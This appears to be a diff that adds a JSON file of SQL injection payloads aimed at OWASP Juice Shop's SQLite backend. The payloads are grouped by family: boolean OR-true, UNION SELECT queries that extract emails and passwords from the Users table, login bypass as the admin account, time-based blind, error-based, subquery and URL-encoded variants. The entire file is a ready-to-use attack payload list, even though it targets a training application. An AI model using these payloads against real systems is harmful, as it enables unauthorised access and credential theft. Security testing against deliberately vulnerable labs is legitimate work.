@@ -1,0 +1,116 @@
+{
+    "payload_families": {
+        "single_quote": {
+            "description": "Basic quote-based error detection (SQLite)",
+            "payloads": [
+                "'",
+                "''",
+                "'--",
+                "' ;",
+                "test'",
+                "\"",
+                "1'",
+                "\\",
+                "'; --",
+                "1\""
+            ]
+        },
+        "or_true": {
+            "description": "Boolean-based OR true condition",
+            "payloads": [
+                "' OR 1=1--",
+                "' OR 1=1;--",
+                "' OR '1'='1'--",
+                "' OR '1'='1",
+                "' OR 'x'='x'--",
+                "1' OR '1'='1",
+                "') OR ('1'='1'--",
+                "') OR 1=1--",
+                "' OR true--",
+                "' OR 'abc'='abc",
+                "1 OR 1=1--",
+                "' OR 1=1 LIMIT 1--",
+                "' OR 1-- -",
+                "') OR ('1'='1"
+            ]
+        },
+        "union_select": {
+            "description": "UNION-based data extraction (SQLite)",
+            "payloads": [
+                "' UNION SELECT 1,2,3,4,5,6,7,8,9--",
+                "' UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--",
+                "' UNION SELECT name,2,3,4,5,6,7,8,9 FROM sqlite_master--",
+                "' UNION SELECT email,password,3,4,5,6,7,8,9 FROM Users--",
+                "' UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--",
+                "')) UNION SELECT 1,2,3,4,5,6,7,8,9--",
+                "')) UNION SELECT email,password,3,4,5,6,7,8,9 FROM Users--",
+                "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
+                "' UNION SELECT tbl_name,2,3,4,5,6,7,8,9 FROM sqlite_master WHERE type='table'--",
+                "' UNION SELECT group_concat(name),2,3,4,5,6,7,8,9 FROM sqlite_master--",
+                "' UNION SELECT sqlite_version(),2,3,4,5,6,7,8,9--"
+            ]
+        },
+        "login_bypass": {
+            "description": "Login form SQLi bypass",
+            "payloads": [
+                "' OR 1=1--",
+                "admin@juice-sh.op'--",
+                "' OR 1=1;--",
+                "admin@juice-sh.op' AND 1=1--",
+                "' OR email LIKE '%admin%'--",
+                "') OR 1=1--",
+                "admin@juice-sh.op' OR '1'='1'--",
+                "' OR role='admin'--",
+                "\" OR 1=1--",
+                "admin'--"
+            ]
+        },
+        "time_based": {
+            "description": "Time-based blind injection (SQLite-compatible)",
+            "payloads": [
+                "' AND (SELECT CASE WHEN 1=1 THEN RANDOMBLOB(500000000) ELSE 1 END)--",
+                "' OR (SELECT CASE WHEN 1=1 THEN RANDOMBLOB(500000000) ELSE 1 END)--",
+                "1' AND (SELECT CASE WHEN 1=1 THEN RANDOMBLOB(100000000) ELSE 1 END)--",
+                "' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM Users)>0 THEN RANDOMBLOB(500000000) ELSE 1 END)--",
+                "') AND (SELECT CASE WHEN 1=1 THEN RANDOMBLOB(500000000) ELSE 1 END)--"
+            ]
+        },
+        "error_based": {
+            "description": "Error-based extraction (SQLite)",
+            "payloads": [
+                "' AND 1=1--",
+                "' AND 1=2--",
+                "' AND (SELECT 1 FROM Users)--",
+                "' AND (SELECT COUNT(*) FROM Users)>0--",
+                "' AND CAST(1 AS TEXT)--",
+                "' AND LENGTH(sqlite_version())>0--",
+                "' AND typeof(1)='integer'--",
+                "' AND (SELECT 1 FROM sqlite_master WHERE type='table')--"
+            ]
+        },
+        "subquery": {
+            "description": "Subquery-based extraction",
+            "payloads": [
+                "' AND (SELECT email FROM Users LIMIT 1)='admin@juice-sh.op'--",
+                "' AND (SELECT COUNT(*) FROM Users)>0--",
+                "' OR (SELECT COUNT(*) FROM Users)>0--",
+                "' AND EXISTS(SELECT 1 FROM Users)--",
+                "' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table')>0--",
+                "' AND (SELECT MAX(id) FROM Users)>0--",
+                "' OR EXISTS(SELECT 1 FROM Users WHERE role='admin')--"
+            ]
+        },
+        "encoded": {
+            "description": "URL/double encoded variants",
+            "payloads": [
+                "%27%20OR%201%3D1--",
+                "%27%20UNION%20SELECT%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9--",
+                "%27%20OR%20%271%27%3D%271",
+                "%27%29%20OR%201%3D1--",
+                "%27+OR+1%3D1--",
+                "%2527",
+                "%27%20OR%20true--"
+            ]
+        }
+    }
+}
